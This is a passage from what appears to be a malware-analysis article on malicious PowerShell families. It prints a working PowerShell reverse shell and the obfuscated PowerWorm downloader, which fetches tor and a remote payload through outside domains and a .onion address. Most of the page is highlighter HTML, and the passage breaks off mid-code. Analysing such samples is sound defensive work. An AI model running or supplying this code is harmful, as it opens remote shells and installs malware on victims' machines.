$client = New-Object System.Net.Sockets.TCPClient("192.168.56.144",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "&amp;gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c981632191770-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c981632191770-1"><span class="crayon-sy">$</span><span class="crayon-v">client</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">Sockets</span><span class="crayon-sy">.</span><span class="crayon-e">TCPClient</span><span class="crayon-sy">(</span><span class="crayon-s">"192.168.56.144"</span><span class="crayon-sy">,</span><span class="crayon-cn">4444</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">stream</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">client</span><span class="crayon-sy">.</span><span class="crayon-e">GetStream</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-t">byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">bytes</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0..255</span><span class="crayon-o">|</span><span class="crayon-o">%</span><span class="crayon-sy">{</span><span class="crayon-cn">0</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">stream</span><span class="crayon-sy">.</span><span class="crayon-e">Read</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">bytes</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">bytes</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">ne</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">TypeName </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Text</span><span class="crayon-sy">.</span><span class="crayon-v">ASCIIEncoding</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">GetString</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">bytes</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">sendback</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">iex</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">data</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Out</span><span class="crayon-o">-</span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">sendback2</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">sendback</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"PS "</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">pwd</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">Path</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;gt; "</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">sendbyte</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">text</span><span class="crayon-sy">.</span><span class="crayon-v">encoding</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">ASCII</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">GetBytes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">sendback2</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">stream</span><span class="crayon-sy">.</span><span class="crayon-e">Write</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">sendbyte</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">sendbyte</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">stream</span><span class="crayon-sy">.</span><span class="crayon-e">Flush</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">client</span><span class="crayon-sy">.</span><span class="crayon-e">Close</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0012 seconds] -->
<p><strong>PowerWorm (19 Samples – 0.46% Coverage)</strong></p>
<p>PowerWorm is a malware family that TrendMicro blogged about in 2014 which has the capability of spreading by infecting other Microsoft Office DOC(X)/XLS(X) files. The PowerShell code is obfuscated with “junk” data placed between the legitimate commands.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c983122992059" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
'xneZtEDC';$ErrorActionPreference = 'SilentlyContinue';'uqaaPxuaCN';'DOBHbJqlkRM';$kn = (get-wmiobject Win32_ComputerSystemProduct).UUID;'WVy';'gKEZgPRMl';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $kn){;'mUzql';'jsvZDTQITNa';(Get-Process -id $pid).Kill();'NgpYRhj';'hVXjCtDvBc';};'tUVXQmXbZ';'lkTzhJZHwxU';'McPzodeY';'vNNYv';function e($dkez){;'TfPD';'WTw';$jt = (((iex "nslookup -querytype=txt $dkez 8.8.8.8") -match '"') -replace '"', '')[0].Trim();'HdCjwAD';'sVSjtZRvr';$ovg.DownloadFile($jt, $tg);'raVw';'OQNdBkS';$ei = $ke.NameSpace($tg).Items();'OgnucmQlK';'Qfqxov';$ke.NameSpace($sa).CopyHere($ei, 20);'GBMdJNr';'VMWS';rd $tg;'pnoFau';'SedloE';};'NxPZPIV';'ypi';'AFElBzCp';'bYRWML';'UYANxqtLg';'QBC';$sa = $env:APPDATA + '\' + $kn;'Eaxyty';'IwuaOh';if (!(Test-Path $sa)){;'amYmrKg';'vWAgqtEB';$qr = New-Item -ItemType Directory -Force -Path $sa;'GqNII';'HNPIQutUpGv';$qr.Attributes = "Hidden", "System", "NotContentIndexed";'MuRuRa';'CmlkCszVCO';};'ZdmIGyj';'nAYhOpvWV';'BIAgIntvoU';'GJTBzyjr';$zul=$sa+ '\tor.exe';'swInqmX';'LTXwOFNSuL';$axs=$sa+ '\polipo.exe';'qkI';'WJPoaNnarn';$tg=$sa+'\'+$kn+'.zip';'Sgw';'fYthyZ';$ovg=New-Object System.Net.WebClient;'Ils';'GRldQfFnfQK';$ke=New-Object -C Shell.Application;'vVoutJQ';'gHXAsaxc';'llaetDv';'Zix';if (!(Test-Path $zul) -or !(Test-Path $axs)){;'QtJINrwhS';'XkAxtKLAJ';e 'i.vankin.de';'QqVujkSIPS';'dZdn';};'GoemQSlIB';'IOcJU';'FYTMzpCupR';'qEnstu';if (!(Test-Path $zul) -or !(Test-Path $axs)){;'ZGtSt';'mHkBgIOsU';e 'gg.ibiz.cc';'sDtXmE';'xSBk';};'YaiaAJqKPin';'gFVK';'TumvJVvJKRm';'ULQwp';$pj=$sa+'\roaminglog';'numdmmhA';'ytEF';saps $zul -Ar " --Log `"notice file $pj`"" -wi Hidden;'JCBc';'CjHbOtf';do{sleep 1;$xxl=gc $pj}while(!($xxl -match 'Bootstrapped 100%: Done.'));'wYtpNVJtdz';'XggiQIPFt';saps $axs -a "socksParentProxy=localhost:9050" -wi Hidden;'dlV';'zVLSO';sleep 7;'FzlDdEynuUz';'Ci';$zpp=New-Object System.Net.WebProxy("localhost:8123");'MsOkmLs';'zRW';$zpp.useDefaultCredentials = $true;'PWXVXIMqb';'lAy';$ovg.proxy=$zpp;'gEkdkGPjVp';'xerooSjz';$ca='http://powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;mom=14C6EFBB-F19D-DC11-83A7-001B38A0DF85&amp;amp;uid=' + $kn;'SGCFq';'GkVVnp';while(!$qmh){$qmh=$ovg.downloadString($ca)};'rHo';'jtshvrR';if ($qmh -ne 'none'){;'Ju';'VuUTlp';iex $qmh;'blhE';'AeIepyNd';};'whSp';</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c983122992059-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c983122992059-1"><span class="crayon-s">'xneZtEDC'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ErrorActionPreference</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'SilentlyContinue'</span><span class="crayon-sy">;</span><span class="crayon-s">'uqaaPxuaCN'</span><span class="crayon-sy">;</span><span class="crayon-s">'DOBHbJqlkRM'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">kn</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">get</span><span class="crayon-o">-</span><span class="crayon-e">wmiobject </span><span class="crayon-v">Win32_ComputerSystemProduct</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">UUID</span><span class="crayon-sy">;</span><span class="crayon-s">'WVy'</span><span class="crayon-sy">;</span><span class="crayon-s">'gKEZgPRMl'</span><span class="crayon-sy">;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">gp </span><span class="crayon-v">HKCU</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-sy">\</span><span class="crayon-v">Software</span><span class="crayon-sy">\</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">CurrentVersion</span><span class="crayon-sy">\</span><span class="crayon-v">Run</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">match</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">kn</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">;</span><span class="crayon-s">'mUzql'</span><span class="crayon-sy">;</span><span class="crayon-s">'jsvZDTQITNa'</span><span class="crayon-sy">;</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Process</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">id</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pid</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">Kill</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-s">'NgpYRhj'</span><span class="crayon-sy">;</span><span class="crayon-s">'hVXjCtDvBc'</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-s">'tUVXQmXbZ'</span><span class="crayon-sy">;</span><span class="crayon-s">'lkTzhJZHwxU'</span><span class="crayon-sy">;</span><span class="crayon-s">'McPzodeY'</span><span class="crayon-sy">;</span><span class="crayon-s">'vNNYv'</span><span class="crayon-sy">;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">e</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">dkez</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">;</span><span class="crayon-s">'TfPD'</span><span class="crayon-sy">;</span><span class="crayon-s">'WTw'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">jt</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-i">iex</span><span class="crayon-h"> </span><span class="crayon-s">"nslookup -querytype=txt $dkez 8.8.8.8"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">match</span><span class="crayon-h"> </span><span class="crayon-s">'"'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">replace</span><span class="crayon-h"> </span><span class="crayon-s">'"'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">Trim</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-s">'HdCjwAD'</span><span class="crayon-sy">;</span><span class="crayon-s">'sVSjtZRvr'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ovg</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">jt</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">tg</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-s">'raVw'</span><span class="crayon-sy">;</span><span class="crayon-s">'OQNdBkS'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ei</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ke</span><span class="crayon-sy">.</span><span class="crayon-t">NameSpace</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">tg</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">Items</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-s">'OgnucmQlK'</span><span class="crayon-sy">;</span><span class="crayon-s">'Qfqxov'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ke</span><span class="crayon-sy">.</span><span class="crayon-t">NameSpace</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">sa</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">CopyHere</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ei</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-s">'GBMdJNr'</span><span class="crayon-sy">;</span><span class="crayon-s">'VMWS'</span><span class="crayon-sy">;</span><span class="crayon-i">rd</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">tg</span><span class="crayon-sy">;</span><span class="crayon-s">'pnoFau'</span><span class="crayon-sy">;</span><span class="crayon-s">'SedloE'</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-s">'NxPZPIV'</span><span class="crayon-sy">;</span><span class="crayon-s">'ypi'</span><span class="crayon-sy">;</span><span class="crayon-s">'AFElBzCp'</span><span class="crayon-sy">;</span><span class="crayon-s">'bYRWML'</span><span class="crayon-sy">;</span><span class="crayon-s">'UYANxqtLg'</span><span class="crayon-sy">;</span><span class="crayon-s">'QBC'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">sa</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-v">APPDATA</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">'\' + $kn;'</span><span class="crayon-i">Eaxyty</span><span class="crayon-s">';'</span><span class="crayon-i">IwuaOh</span><span class="crayon-s">';if (!(Test-Path $sa)){;'</span><span class="crayon-i">amYmrKg</span><span class="crayon-s">';'</span><span class="crayon-i">vWAgqtEB</span><span class="crayon-s">';$qr = New-Item -ItemType Directory -Force -Path $sa;'</span><span class="crayon-i">GqNII</span><span class="crayon-s">';'</span><span class="crayon-i">HNPIQutUpGv</span><span class="crayon-s">';$qr.Attributes = "Hidden", "System", "NotContentIndexed";'</span><span class="crayon-i">MuRuRa</span><span class="crayon-s">';'</span><span class="crayon-i">CmlkCszVCO</span><span class="crayon-s">';};'</span><span class="crayon-i">ZdmIGyj</span><span class="crayon-s">';'</span><span class="crayon-i">nAYhOpvWV</span><span class="crayon-s">';'</span><span class="crayon-i">BIAgIntvoU</span><span class="crayon-s">';'</span><span class="crayon-i">GJTBzyjr</span><span class="crayon-s">';$zul=$sa+ '</span><span class="crayon-sy">\</span><span class="crayon-v">tor</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">';'</span><span class="crayon-i">swInqmX</span><span class="crayon-s">';'</span><span class="crayon-i">LTXwOFNSuL</span><span class="crayon-s">';$axs=$sa+ '</span><span class="crayon-sy">\</span><span class="crayon-v">polipo</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">';'</span><span class="crayon-i">qkI</span><span class="crayon-s">';'</span><span class="crayon-i">WJPoaNnarn</span><span class="crayon-s">';$tg=$sa+'</span><span class="crayon-sy">\</span>'<span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">kn</span><span class="crayon-o">+</span><span class="crayon-s">'.zip'</span><span class="crayon-sy">;</span><span class="crayon-s">'Sgw'</span><span class="crayon-sy">;</span><span class="crayon-s">'fYthyZ'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ovg</span><span class="crayon-o">=</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">;</span><span class="crayon-s">'Ils'</span><span class="crayon-sy">;</span><span class="crayon-s">'GRldQfFnfQK'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">ke</span><span class="crayon-o">=</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">C</span><span class="crayon-h"> </span><span class="crayon-v">Shell</span><span class="crayon-sy">.</span><span class="crayon-v">Application</span><span class="crayon-sy">;</span><span class="crayon-s">'vVoutJQ'</span><span class="crayon-sy">;</span><span class="crayon-s">'gHXAsaxc'</span><span class="crayon-sy">;</span><span class="crayon-s">'llaetDv'</span><span class="crayon-sy">;</span><span class="crayon-s">'Zix'</span><span class="crayon-sy">;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">Test</span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">zul</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">Test</span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">axs</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">;</span><span class="crayon-s">'QtJINrwhS'</span><span class="crayon-sy">;</span><span class="crayon-s">'XkAxtKLAJ'</span><span class="crayon-sy">;</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-s">'i.vankin.de'</span><span class="crayon-sy">;</span><span class="crayon-s">'QqVujkSIPS'</span><span class="crayon-sy">;</span><span class="crayon-s">'dZdn'</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-s">'GoemQSlIB'</span><span class="crayon-sy">;</span><span class="crayon-s">'IOcJU'</span><span class="crayon-sy">;</span><span class="crayon-s">'FYTMzpCupR'</span><span class="crayon-sy">;</span><span class="crayon-s">'qEnstu'</span><span class="crayon-sy">;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">Test</span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">zul</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">Test</span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">axs</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">;</span><span class="crayon-s">'ZGtSt'</span><span class="crayon-sy">;</span><span class="crayon-s">'mHkBgIOsU'</span><span class="crayon-sy">;</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-s">'gg.ibiz.cc'</span><span class="crayon-sy">;</span><span class="crayon-s">'sDtXmE'</span><span class="crayon-sy">;</span><span class="crayon-s">'xSBk'</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-s">'YaiaAJqKPin'</span><span class="crayon-sy">;</span><span class="crayon-s">'gFVK'</span><span class="crayon-sy">;</span><span class="crayon-s">'TumvJVvJKRm'</span><span class="crayon-sy">;</span><span class="crayon-s">'ULQwp'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">pj</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">sa</span><span class="crayon-o">+</span><span class="crayon-s">'\roaminglog'</span><span class="crayon-sy">;</span><span class="crayon-s">'numdmmhA'</span><span class="crayon-sy">;</span><span class="crayon-s">'ytEF'</span><span class="crayon-sy">;</span><span class="crayon-i">saps</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">zul</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Ar</span><span class="crayon-h"> </span><span class="crayon-s">" --Log `"</span><span class="crayon-e">notice </span><span class="crayon-i">file</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pj</span><span class="crayon-sy">`</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">wi </span><span class="crayon-v">Hidden</span><span class="crayon-sy">;</span><span class="crayon-s">'JCBc'</span><span class="crayon-sy">;</span><span class="crayon-s">'CjHbOtf'</span><span class="crayon-sy">;</span><span class="crayon-st">do</span><span class="crayon-sy">{</span><span class="crayon-i">sleep</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">xxl</span><span class="crayon-o">=</span><span class="crayon-i">gc</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pj</span><span class="crayon-sy">}</span><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">xxl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">match</span><span class="crayon-h"> </span><span class="crayon-s">'Bootstrapped 100%: Done.'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-s">'wYtpNVJtdz'</span><span class="crayon-sy">;</span><span class="crayon-s">'XggiQIPFt'</span><span class="crayon-sy">;</span><span class="crayon-i">saps</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">axs</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-s">"socksParentProxy=localhost:9050"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">wi </span><span class="crayon-v">Hidden</span><span class="crayon-sy">;</span><span class="crayon-s">'dlV'</span><span class="crayon-sy">;</span><span class="crayon-s">'zVLSO'</span><span class="crayon-sy">;</span><span class="crayon-i">sleep</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">;</span><span class="crayon-s">'FzlDdEynuUz'</span><span class="crayon-sy">;</span><span class="crayon-s">'Ci'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">zpp</span><span class="crayon-o">=</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-e">WebProxy</span><span class="crayon-sy">(</span><span class="crayon-s">"localhost:8123"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-s">'MsOkmLs'</span><span class="crayon-sy">;</span><span class="crayon-s">'zRW'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">zpp</span><span class="crayon-sy">.</span><span class="crayon-v">useDefaultCredentials</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-t">true</span><span class="crayon-sy">;</span><span class="crayon-s">'PWXVXIMqb'</span><span class="crayon-sy">;</span><span class="crayon-s">'lAy'</span><span 